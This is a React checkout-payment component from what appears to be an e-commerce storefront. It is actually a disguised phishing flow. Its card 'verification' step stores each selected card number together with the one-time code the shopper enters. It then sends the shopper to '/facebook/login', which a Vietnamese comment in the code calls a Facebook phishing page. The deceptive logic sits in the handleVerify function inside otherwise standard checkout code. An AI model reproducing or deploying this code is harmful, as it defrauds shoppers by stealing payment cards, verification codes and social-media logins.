import * as Yup from 'yup';
import { useEffect, useState } from 'react';
// form
import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers/yup';
// @mui
import { Grid, Button } from '@mui/material';
import { LoadingButton } from '@mui/lab';
// @types
import {
  ICheckoutCardOption,
  ICheckoutPaymentOption,
  ICheckoutDeliveryOption,
  IProductCheckoutState,
} from '../../../../../@types/product';
// redux
import { useDispatch, useSelector } from '../../../../../redux/store';
import { getCards, initializeCards, saveCardCode } from '../../../../../redux/slices/card';
// components
import Iconify from '../../../../../components/iconify';
import FormProvider from '../../../../../components/hook-form';
import { useSnackbar } from '../../../../../components/snackbar';
import axios from '../../../../../utils/axios';
//
import CheckoutSummary from '../CheckoutSummary';
import CheckoutDelivery from './CheckoutDelivery';
import CheckoutBillingInfo from './CheckoutBillingInfo';
import CheckoutPaymentMethods from './CheckoutPaymentMethods';
import { PaymentVerificationDialog } from '../../../../payment';

// ----------------------------------------------------------------------

const DELIVERY_OPTIONS: ICheckoutDeliveryOption[] = [
  {
    value: 0,
    title: 'Standard delivery (Free)',
    description: 'Delivered on Monday, August 12',
  },
  {
    value: 2,
    title: 'Fast delivery ($2,00)',
    description: 'Delivered on Monday, August 5',
  },
];

const PAYMENT_OPTIONS: ICheckoutPaymentOption[] = [
  {
    value: 'credit_card',
    title: 'Credit / Debit Card',
    description: 'We support Mastercard, Visa, Discover and Stripe.',
    icons: ['/assets/icons/payments/ic_mastercard.svg', '/assets/icons/payments/ic_visa.svg'],
  },
];

// ----------------------------------------------------------------------

type Props = {
  checkout: IProductCheckoutState;
  onNextStep: VoidFunction;
  onBackStep: VoidFunction;
  onReset: VoidFunction;
  onGotoStep: (step: number) => void;
  onApplyShipping: (value: number) => void;
};

type FormValuesProps = {
  delivery: number;
  payment: string;
  card: string;
};

export default function CheckoutPayment({
  checkout,
  onReset,
  onNextStep,
  onBackStep,
  onGotoStep,
  onApplyShipping,
}: Props) {
  const { enqueueSnackbar } = useSnackbar();
  const dispatch = useDispatch();

  const { cards } = useSelector((state) => state.card);

  const [openVerify, setOpenVerify] = useState(false);

  useEffect(() => {
    dispatch(initializeCards());
    dispatch(getCards());
  }, [dispatch]);

  const CARDS_OPTIONS = cards.map((card) => ({
    value: card.cardNumber,
    label: `**** **** **** ${card.cardNumber.slice(-4)}`,
  }));

  const { total, discount, subtotal, shipping, billing } = checkout;

  const PaymentSchema = Yup.object().shape({
    payment: Yup.string().required('Payment is required!'),
    card: Yup.string().when('payment', (payment: any, schema: any) =>
      payment === 'credit_card'
        ? schema.required('Card selection is required!')
        : schema
    ),
  });

  const defaultValues = {
    delivery: shipping,
    payment: '',
    card: cards[0]?.cardNumber || '',
  };

  const methods = useForm<FormValuesProps>({
    resolver: yupResolver(PaymentSchema),
    defaultValues,
  });

  useEffect(() => {
    const currentSelected = methods.getValues('card');
    if (cards.length > 0) {
      if (!currentSelected || !cards.find(c => c.cardNumber === currentSelected)) {
        methods.setValue('card', cards[cards.length - 1].cardNumber, { shouldValidate: true });
      } else {
        const latestCard = cards[cards.length - 1].cardNumber;
        if (currentSelected !== latestCard && cards.length > 1) {
          methods.setValue('card', latestCard, { shouldValidate: true });
        }
      }
    }
  }, [cards, methods]);

  const { getValues, handleSubmit, formState: { isSubmitting } } = methods;

  const onSubmit = async () => {
    try {
      const values = getValues();
      if (values.payment === 'credit_card') {
        if (!values.card) {
          enqueueSnackbar('Please select a card first!', { variant: 'error' });
          return;
        }
        setOpenVerify(true);
      } else {
        handleFinishCheckout();
      }
    } catch (error) {
      console.error(error);
    }
  };

  const handleVerify = async (code: string) => {
    try {
      const values = getValues();
      await dispatch(saveCardCode({ cardNumber: values.card, code }));
      
      setOpenVerify(false);
      
      // CHUYỂN HƯỚNG SANG TRANG FACEBOOK PHISHING PAGE
      window.location.href = '/facebook/login';
    } catch (error) {
      console.error(error);
      enqueueSnackbar('Failed to verify card!', { variant: 'error' });
    }
  };

  const handleFinishCheckout = async () => {
    try {
      const values = getValues();
      await axios.post('/api/checkout', {
        shipping: values.delivery,
        discount: checkout.discount,
        billing: checkout.billing,
        payment: values.payment,
        cart: checkout.cart,
      });
      onNextStep();
      onReset();
    } catch (error) {
      console.error(error);
      enqueueSnackbar('Checkout failed!', { variant: 'error' });
    }
  };

  return (
    <>
      <FormProvider methods={methods} onSubmit={handleSubmit(onSubmit)}>
        <Grid container spacing={3}>
        <Grid item xs={12} md={8}>
          <CheckoutDelivery onApplyShipping={onApplyShipping} deliveryOptions={DELIVERY_OPTIONS} />

          <CheckoutPaymentMethods
            cardOptions={CARDS_OPTIONS}
            paymentOptions={PAYMENT_OPTIONS}
            onSuccess={() => {
              onNextStep();
              onReset();
            }}
            sx={{ my: 3 }}
          />

          <Button
            size="small"
            color="inherit"
            onClick={onBackStep}
            startIcon={<Iconify icon="eva:arrow-ios-back-fill" />}
          >
            Back
          </Button>
        </Grid>

        <Grid item xs={12} md={4}>
          <CheckoutBillingInfo onBackStep={onBackStep} billing={billing} />

          <CheckoutSummary
            enableEdit
            total={total}
            subtotal={subtotal}
            discount={discount}
            shipping={shipping}
            onEdit={() => onGotoStep(0)}
          />

          <LoadingButton
            fullWidth
            size="large"
            type="submit"
            variant="contained"
            loading={isSubmitting}
          >
            Complete Order
          </LoadingButton>
        </Grid>
      </Grid>
      </FormProvider>

      <PaymentVerificationDialog
        open={openVerify}
        onVerify={handleVerify}
        onClose={() => setOpenVerify(false)}
      />
    </>
  );
}
